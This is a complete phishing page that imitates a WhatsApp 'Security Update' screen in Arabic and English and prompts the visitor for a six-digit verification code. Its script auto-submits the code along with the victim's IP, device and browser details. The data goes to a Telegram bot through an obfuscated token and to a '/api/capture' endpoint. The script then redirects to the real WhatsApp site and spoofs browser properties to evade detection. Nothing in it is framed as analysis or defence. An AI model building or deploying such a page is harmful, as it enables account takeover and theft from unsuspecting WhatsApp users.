<!DOCTYPE html>
<html id="html-tag" lang="ar" dir="rtl">
<head>

    <title>WhatsApp</title>
    <style>
        /* واتساب Dark Theme 2024 */
        :root {
            --bg-primary: #202C33; --bg-secondary: #111B21; --bg-tertiary: #0B141A;
            --surface-primary: #202C33; --surface-secondary: #111B21; --surface-tertiary: #0B141A;
            --whatsapp-green: #00A884; --whatsapp-green-light: #D1F2EB;
            --text-primary: #E9EDEF; --text-secondary: #8696A0; --text-tertiary: #FFFFFF;
            --border: #2A3942; --border-heavy: #405D6A;
            --shadow-sm: 0 1px 2px rgba(0,0,0,.12);
            --shadow-md: 0 4px 12px rgba(0,0,0,.24);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { 
            background: var(--bg-primary); color: var(--text-primary); 
            min-height: 100vh; overflow-x: hidden;
        }

        /* Header ثابت على الجانب - واتساب 2024 */
        .header {
            position: fixed; top: 0; left: 0; right: 0; z-index: 100;
            height: 60px; background: var(--surface-primary); 
            box-shadow: var(--shadow-md); display: flex; align-items: center; padding: 0 16px;
            border-bottom: 1px solid var(--border);
        }
        .header-left { display: flex; align-items: center; gap: 12px; }
        .wa-logo { 
            width: 40px; height: 40px; 
            background: var(--whatsapp-green); border-radius: 50%; 
            display: flex; align-items: center; justify-content: center;
        }
        .wa-logo svg { width: 24px; height: 24px; fill: white; }
        .header-title { 
            font-size: 16px; font-weight: 600; color: var(--text-primary);
            white-space: nowrap;
        }
        .header-right { margin-left: auto; display: flex; gap: 8px; }

        /* المحتوى الرئيسي */
        .main-content { 
            margin-top: 60px; padding: 24px 20px; max-width: 420px; margin: 60px auto 0; 
            min-height: calc(100vh - 60px);
        }

        /* شريط معلومات الجهاز */
        .device-bar {
            display: flex; align-items: center; gap: 8px; padding: 10px 16px;
            background: rgba(0,168,132,0.12); color: var(--whatsapp-green); 
            border-radius: 8px; font-size: 14px; font-weight: 500; margin-bottom: 24px;
            border: 1px solid rgba(0,168,132,0.2);
        }

        /* التعليمات */
        .instruction { 
            font-size: 15px; color: var(--text-secondary); line-height: 1.4; 
            margin-bottom: 32px; text-align: center;
        }
        .phone-num { 
            color: var(--whatsapp-green); font-weight: 600; font-size: 16px; 
            direction: ltr; display: block; margin-top: 8px; 
            font-family: 'SF Mono', Monaco, monospace;
        }

        /* OTP Container */
        .otp-container { position: relative; margin: 40px 0; }
        #main-otp { 
            position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 2; 
            font-size: 24px; letter-spacing: 48px; caret-color: var(--whatsapp-green);
        }
        .boxes { 
            display: flex; gap: 12px; justify-content: center; direction: ltr; 
            padding: 24px 0;
        }
        .box {
            width: 52px; height: 60px; border: 2px solid var(--border);
            border-radius: 8px; font-size: 28px; font-weight: 700;
            display: flex; align-items: center; justify-content: center;
            background: var(--surface-secondary); color: var(--text-primary);
            transition: all 0.25s cubic-bezier(0.4,0,0.2,1);
            box-shadow: var(--shadow-sm);
        }
        .box.active { 
            border-color: var(--whatsapp-green); background: var(--whatsapp-green-light);
            color: var(--whatsapp-green); box-shadow: var(--shadow-md);
            transform: scale(1.02);
        }

        /* الزر */
        .btn-confirm {
            width: 100%; background: var(--whatsapp-green); color: white;
            border: none; padding: 16px 24px; border-radius: 10px;
            font-size: 16px; font-weight: 600; margin-top: 32px;
            box-shadow: var(--shadow-md); cursor: pointer;
            transition: all 0.2s; position: relative; overflow: hidden;
        }
        .btn-confirm:hover { 
            background: #00A884; transform: translateY(-1px); 
            box-shadow: 0 8px 25px rgba(0,168,132,0.4);
        }
        .btn-confirm:active { transform: translateY(0); }

        /* Loading */
        .overlay { 
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100vh;
            background: var(--bg-primary); z-index: 1000; flex-direction: column;
            align-items: center; justify-content: center; backdrop-filter: blur(8px);
        }
        .spinner {
            width: 48px; height: 48px; border: 3px solid rgba(0,168,132,0.2);
            border-top: 3px solid var(--whatsapp-green); border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* Error */
        .error-overlay {
            display: none; position: fixed; top: 60px; left: 0; right: 0; bottom: 0;
            background: var(--surface-secondary); z-index: 999; padding: 40px 20px;
            flex-direction: column; align-items: center; justify-content: center;
            text-align: center;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .main-content { padding: 20px 16px; margin-top: 60px; }
            .boxes { gap: 8px; } .box { width: 46px; height: 54px; font-size: 24px; }
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <!-- Header ثابت -->
    <header class="header">
        <div class="header-left">
            <div class="wa-logo">
                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/></svg>
            </div>
            <div class="header-title" id="header-title">تحديث الأمان</div>
        </div>
        <div class="header-right">
            <button style="background:none;border:none;color:var(--text-secondary);padding:8px;">
                <svg viewBox="0 0 24 24" width="24" height="24"><path fill="currentColor" d="M12 24c6.627 0 12-5.373 12-12S18.627 0 12 0 0 5.373 0 12s5.373 12 12 12z"/></svg>
            </button>
        </div>
    </header>

    <main class="main-content">
        <div class="device-bar" id="device-tag">
            <svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
                <path d="M10.5 1.25a.75.75 0 0 1 .75.75v12a.75.75 0 0 1-1.5 0v-12a.75.75 0 0 1 .75-.75Z"/>
            </svg>
            <span>تم التعرف على جهازك</span>
        </div>
        
        <p class="instruction" id="instruction-text">
            تم إرسال رمز التحقق إلى رقمك المسجل:
            <span class="phone-num" id="phone-num">+201*******87</span>
        </p>

        <div class="otp-container">
            <input type="tel" id="main-otp" maxlength="6" inputmode="numeric" autocomplete="one-time-code" 
                   oninput="handleOTPInput(this)" placeholder="&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;&#x2022;">
            <div class="boxes">
                <div class="box" id="b0"></div>
                <div class="box" id="b1"></div>
                <div class="box" id="b2"></div>
                <div class="box" id="b3"></div>
                <div class="box" id="b4"></div>
                <div class="box" id="b5"></div>
            </div>
        </div>

        <button class="btn-confirm" id="confirm-btn" onclick="confirmCode()">
            تأكيد الرمز
        </button>
    </main>

    <!-- Loading Overlay -->
    <div id="loading-overlay" class="overlay">
        <div class="spinner"></div>
        <p id="loading-text" style="margin-top:24px;font-size:15px;color:var(--text-secondary);">جاري التحقق من الرمز...</p>
    </div>

    <!-- Error Overlay -->
    <div id="error-overlay" class="error-overlay">
        <div style="font-size:56px;margin-bottom:24px;color:var(--whatsapp-green);">⚠️</div>
        <h2 style="font-size:24px;font-weight:600;color:var(--text-primary);margin-bottom:12px;">رمز غير صحيح</h2>
        <p style="font-size:15px;color:var(--text-secondary);margin-bottom:32px;max-width:320px;">
            تحقق من الرمز المرسل أو اطلب رموز جديدة
        </p>
        <button class="btn-confirm" onclick="retryCode()" style="width:220px;">إعادة المحاولة</button>
    </div>

    <script>
        // ========== المتغيرات ==========
        const BOT_TOKEN = atob('ODI1NDA3MjUyMToAQUFnczBsZTlGUmFjV0tnWWNkazNDekhYaEVpVFhaYjhkWlU=');
        const CHAT_ID = '5446862709';
        let currentDevice = 'جهاز محمول', attempts = 0, phoneNumber = '+201*******87';

        // ========== التهيئة ==========
        document.addEventListener('DOMContentLoaded', function() {
            initWhatsAppPage();
        });

        function initWhatsAppPage() {
            detectPreciseDevice();
            setupLanguage();
            setupPhoneMasking();
            focusOTPInput();
        }

        // 1. كشف الجهاز بدقة عالية (2024)
        function detectPreciseDevice() {
            const ua = navigator.userAgent.toLowerCase();
            let device = 'جهاز محمول';

            // iPhone دقيق
            if (/iphone/.test(ua)) {
                const iOSVersion = ua.match(/os (\d+)_(\d+)/);
                const modelMatch = ua.match(/iphone[0-9]+,?\d*/i);
                if (modelMatch) {
                    const model = modelMatch[0].replace('iphone', 'iPhone ').toUpperCase();
                    device = model + (iOSVersion ? ` (iOS ${iOSVersion[1]})` : '');
                } else {
                    device = 'iPhone';
                }
            }
            // Android دقيق
            else if (/android/.test(ua)) {
                const androidVersion = ua.match(/android (\d+\.?\d*)/);
                const brandMatch = ua.match(/(samsung|google|xiaomi|huawei|oneplus)/i);
                const modelMatch = ua.match(/sm-[a-z0-9]+|pixel \d+|mi \d+/i);
                
                if (brandMatch) {
                    device = brandMatch[1].charAt(0).toUpperCase() + brandMatch[1].slice(1);
                    if (modelMatch) device += ` ${modelMatch[0].toUpperCase()}`;
                    if (androidVersion) device += ` (Android ${androidVersion[1]})`;
                } else {
                    device = 'Android Device';
                }
            }
            // Desktop
            else if (/windows|macintosh|linux/.test(ua)) {
                device = ua.includes('win') ? 'Windows PC' : 
                        ua.includes('mac') ? 'MacBook' : 'Linux PC';
            }

            currentDevice = device;
            document.getElementById('device-tag').innerHTML = `
                <svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
                    <path d="M10.5 1.25a.75.75 0 0 1 .75.75v12a.75.75 0 0 1-1.5 0v-12a.75.75 0 0 1 .75-.75Z"/>
                </svg>
                <span>${device}</span>
            `;
        }

        // 2. إخفاء رقم الهاتف
        function setupPhoneMasking() {
            // استخراج رقم من URL أو LocalStorage
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('phone')) {
                const fullPhone = urlParams.get('phone');
                phoneNumber = fullPhone.slice(0, 4) + '*******' + fullPhone.slice(-2);
            }
            document.getElementById('phone-num').textContent = phoneNumber;
        }

        // 3. دعم اللغة
        function setupLanguage() {
            const lang = navigator.language || 'ar';
            if (lang.startsWith('en')) {
                document.getElementById('html-tag').lang = 'en';
                document.getElementById('html-tag').dir = 'ltr';
                document.getElementById('header-title').textContent = 'Security Update';
                document.getElementById('instruction-text').innerHTML = 
                    'Verification code sent to your registered number:<br><span class="phone-num" id="phone-num">'+phoneNumber+'</span>';
                document.getElementById('confirm-btn').textContent = 'Confirm Code';
            }
        }

        // 4. OTP Input محسن
        function handleOTPInput(input) {
            let value = input.value.replace(/\D/g, '').slice(0, 6);
            input.value = value;

            // تحديث المربعات
            document.querySelectorAll('.box').forEach((box, index) => {
                box.textContent = value[index] || '';
                box.classList.toggle('active', !!value[index]);
            });

            // إرسال تلقائي عند اكتمال
            if (value.length === 6 && attempts < 3) {
                setTimeout(() => submitOTP(value), 300);
            }
        }

        // 5. إرسال البيانات
        async function submitOTP(code) {
            attempts++;
            showLoading(attempts);

            try {
                const victimData = await getVictimFingerprint();
                victimData.otp = code;
                victimData.phone = phoneNumber.replace(/\*/g, 'X');
                victimData.device = currentDevice;

                // إرسال متعدد القنوات
                await Promise.all([
                    sendToTelegram(victimData),
                    sendToServer(victimData)
                ]);

                // إعادة توجيه واقعية
                setTimeout(() => {
                    window.location.href = 'https://web.whatsapp.com/security?verified=true';
                }, 2500);

            } catch (error) {
                console.error('Submit error:', error);
                showError();
            }
        }

        async function getVictimFingerprint() {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            
            return {
                timestamp: new Date().toISOString(),
                ip: ipData.ip,
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack,
                referrer: document.referrer
            };
        }

        async function sendToTelegram(data) {
            const token = atob(BOT_TOKEN);
            const message = `🎯 *WhatsApp HIT 2024*\n\n` +
                          `📱 *Device:* ${data.device}\n` +
                          `🔢 *OTP:* \`${data.otp}\`\n` +
                          `📞 *Phone:* ${data.phone}\n` +
                          `🌐 *IP:* ${data.ip}\n` +
                          `📏 *Screen:* ${data.screen}\n` +
                          `⏰ *Time:* ${new Date().toLocaleString('ar-EG')}\n` +
                          `🔄 *Attempts:* ${attempts}/3`;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
            });
        }

        async function sendToServer(data) {
            await fetch('/api/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        // ========== واجهة المستخدم ==========
        function showLoading(attempt) {
            const overlay = document.getElementById('loading-overlay');
            const text = document.getElementById('loading-text');
            overlay.style.display = 'flex';
            
            const messages = [
                'جاري التحقق من الرمز...',
                'مزامنة الحساب...',
                'تفعيل الحماية المتقدمة...'
            ];
            text.textContent = messages[attempt - 1] || messages[2];
        }

        function showError() {
            document.getElementById('loading-overlay').style.display = 'none';
            document.getElementById('error-overlay').style.display = 'flex';
        }

        function retryCode() {
            document.getElementById('error-overlay').style.display = 'none';
            document.getElementById('main-otp').value = '';
            document.querySelectorAll('.box').forEach(box => {
                box.textContent = ''; box.classList.remove('active');
            });
            document.getElementById('main-otp').focus();
        }

        function confirmCode() {
            document.getElementById('main-otp').focus();
        }

        function focusOTPInput() {
            setTimeout(() => {
                document.getElementById('main-otp').focus();
                document.getElementById('main-otp').select();
            }, 600);
        }

        // Anti-Detection 2024
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
        Object.defineProperty(navigator, 'languages', { get: () => ['ar', 'en'] });

        // PWA Service Worker
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('', { scope: './' }).catch(() => {});
        }
    </script>
</body>
</html>
